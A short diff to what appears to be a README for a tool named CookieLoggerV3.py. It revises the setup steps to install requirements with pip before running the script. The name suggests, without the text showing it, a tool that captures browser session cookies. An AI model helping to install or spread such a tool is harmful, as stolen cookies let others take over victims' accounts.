@@ -29,7 +29,7 @@ step 0; if you dont have python3 installed go to https://www.python.org/download
 
 Step 1; Download Zip and extract
 
-Step 2; Go To CMD cd to the directory where you saved CookieLoggerV3.py the run: python3 CookieLogger.py
+Step 2; Go To CMD cd to the directory where you saved CookieLoggerV3.py the run: pip3 install -r requirements.txt and wait the run: python3 CookieLoggerV3.py
 
 Step 3; Wait For gui to load
 
